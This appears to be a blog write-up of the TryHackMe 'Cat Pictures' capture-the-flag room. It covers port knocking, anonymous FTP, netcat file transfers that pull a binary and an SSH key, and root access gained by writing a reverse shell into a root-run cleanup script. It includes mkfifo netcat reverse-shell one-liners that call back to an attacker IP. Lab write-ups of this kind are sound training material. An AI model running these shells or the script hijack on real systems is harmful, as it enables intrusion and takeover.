---
layout: post
title: "Cat Pictures"
date: 2022-10-20
categories: [Tryhackme, Easy-THM]
tags: [rustscan, phpBB, port-knocking, ftp, reverse-shell, id_rsa]
image: ../../assets/img/posts/catpictures.png 

---

## Description

I made a forum where you can post cute cat pictures!

|**Room**|[Cat Pictures](https://tryhackme.com/room/catpictures)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[gamercat](https://tryhackme.com/p/gamercat)|

---

Starting off with deploying the machine and quickly scanning the open ports with rustscan,

```bash
rustscan -a 10.10.88.63 --ulimit 5000
```

![image](https://user-images.githubusercontent.com/67465230/187354361-be5629aa-e728-42d0-9044-aa3941f9681e.png)

Now, that we know about open ports, we can scan them in detail with nmap,

```bash
nmap -sC -sV -p22,8080 10.10.88.63
```

![image](https://user-images.githubusercontent.com/67465230/187354386-b84e964a-22af-46c9-a1cc-cf39bf95a87f.png)

Result shows that port 22 is running ssh service, port 8080 is running apache webserver.

Let's visit http://10.10.88.63,

![image](https://user-images.githubusercontent.com/67465230/187354539-5b090893-58fc-44b4-8e86-4819e42d2faf.png)

we got a webserver running phpBB software. 

Playing around with the website and I found something useful. A user comment, with a hint of _knock_,

![image](https://user-images.githubusercontent.com/67465230/187354574-4e837f83-233d-4810-9817-181dc3c649d7.png)

This _knock_ can be meaning of Port Knocking, I guess. 

So after searching about Port Knocking, a suitable explanation I found is, "_port knocking is a method of externally opening ports on a firewall by generating a connection attempt on a set of pre-specified closed ports_". Since, there are some numbers given to us, so we can use a Port knocking script - [knock](https://github.com/grongor/knock).

```bash
./knock 10.10.175.30 1111 2222 3333 4444
```

Note: Running this script won't return anything but we have to scan the ports again so quickly scanning the open ports with rustscan,

```bash
rustscan -a 10.10.202.14 --ulimit 5000
```

![image](https://user-images.githubusercontent.com/67465230/187354614-2602543e-a48d-4cbc-a3a5-f62e31db87b9.png)

Now, we have some new ports open, let's scan them in detail with nmap,

```bash
nmap -sC -sV -p21,22,4420,8080 10.10.202.14
```

![image](https://user-images.githubusercontent.com/67465230/187354666-e4129270-02f3-41a1-b670-080497f66b15.png)
![image](https://user-images.githubusercontent.com/67465230/187354703-7453c3c9-1496-41c5-a8f8-f1b7c6ecdf1e.png)

Result scan shows that new port 21 is running ftp service with anonymous login, port 4420 is running a kind of server.

Enumerating FTP service first with logging anonymously,

```bash
ftp 10.10.202.14
```

![image](https://user-images.githubusercontent.com/67465230/187354732-4f0a0fd6-f640-41ff-8795-495075cec619.png)

Enumerating directory,

![image](https://user-images.githubusercontent.com/67465230/187354766-116378f5-282c-4a30-81c2-fdb15f72e367.png)

there is a file named note.txt. 

Downloading the file on our system,

```bash
get note.txt
```

This file is successfully downloaded on our system.

Now, reading the content of the file,

![image](https://user-images.githubusercontent.com/67465230/187355039-93996cba-8f50-42c1-963d-b6d57798828c.png)

there is a password for the port 4420 (what we just found) by the user.

Let's login to that port,

```bash
nc 10.10.202.14 4420
```

![image](https://user-images.githubusercontent.com/67465230/187355073-bde74a42-9066-4083-98b6-eba1d729f01b.png)

when we try to access the port 4420, we are prompted with login credentials, so we have to login using the password we just get from catlover user.

Enumerating directory, this is a file structure of linux systems,

![image](https://user-images.githubusercontent.com/67465230/187355109-03501a71-29e6-414b-83d5-24fff58a347e.png)

Let's move into **home** directory to see if there is something interesting,

![image](https://user-images.githubusercontent.com/67465230/187355147-b9083c71-e488-49f4-974e-5cc6d1546c6e.png)

there is a runme binary.

I can't run this binary on the current shell itself,

![image](https://user-images.githubusercontent.com/67465230/187355432-43b6d0a4-ba0f-4bfd-90e7-d4f14f74616b.png)

we just need the regular shell to execute this binary because this shell doesn't have much functionality.

Viewing what commands we have in order to construct a reverse shell,

![image](https://user-images.githubusercontent.com/67465230/187355469-53174484-f709-4067-825c-837c9dbeed01.png)

we have all the basic commands using which we can construct the netcat reverse shell.

Now, start a netcat listener using `nc -nvlp 4444` and execute the following one-liner script into victim machine,

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.9.0.197 4444 >/tmp/f
```

![image](https://user-images.githubusercontent.com/67465230/187355512-8d16287a-2b04-4cf7-bd15-8c9485a19716.png)

we got the shell right of the bat. 

Now, running the binary `./runme`, 

![image](https://user-images.githubusercontent.com/67465230/187355551-9f42d162-6d02-4d73-8142-12795269a023.png)

it prompted for password and we provide the password but we got "Access Denied" message. 

Since, it is not worth to execute this binary of the shell itself, let's download the binary on our system using netcat,

```bash
nc -nlvp 9999 > runme #(victim)
nc -N 10.9.0.197 9999 < /home/catlover/runme #(attacker)
```

Now, that our binary has been downloaded on our system, we can start analyzing the file, 

```bash
strings runme
```

![image](https://user-images.githubusercontent.com/67465230/187355624-c99da0c2-760c-4ebb-9914-c20bdf60362f.png)

after scrolling down a bit, I can see the password. 

Now, we can run the binary again (on victim machine) and it will prompt for the password,

![image](https://user-images.githubusercontent.com/67465230/187355659-10c38a95-72c7-4c94-a947-8203bf06a85b.png)

After providing the password, application says, SSH key transfer queued.

Enumerating **/home/catlover** directory,

![image](https://user-images.githubusercontent.com/67465230/187355735-990d3e92-32cb-47d9-866f-036c5d11cfab.png)

we got an id_rsa key.

Let's download this key using **netcat** again,

```bash
nc -nlvp 9999 > id_rsa #(victim)
nc -N 10.9.0.197 9999 < /home/catlover/id_rsa #(attacker)
```

Now, we need to give this key certain permissions and then we can login using catlover user with id_rsa key,

```bash
chmod 600 id_rsa
ssh -i id_rsa catlover@10.10.202.14
```

![image](https://user-images.githubusercontent.com/67465230/187355819-292818b8-e248-4988-bcfe-501f3b083241.png)

Enumerating directory, we got the flag,

![image](https://user-images.githubusercontent.com/67465230/187355859-2dca330d-b989-4c78-94b0-b8f779aa2ff6.png)

Again, enumerating /opt directory,

![image](https://user-images.githubusercontent.com/67465230/187355896-44975432-415e-4c0d-95f0-b1b05d1c03a8.png)

we got a bash script of which the owner is root and will be run by root.

Taking a look at what script does, 

![image](https://user-images.githubusercontent.com/67465230/187355922-cddb1c63-3a60-4c44-bc09-23edd3571182.png)

this script is deleting everything from /tmp directory. 

Now, start the netcat listener using `nc -nvlp 6666` and we can put the one-liner netcat reverse shell in this script,

```bash
cat > clean.sh

#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.197 6666 >/tmp/f
```

![image](https://user-images.githubusercontent.com/67465230/187356027-d12565a0-de7a-4c27-809b-853f41e54e37.png)

we got the root shell.
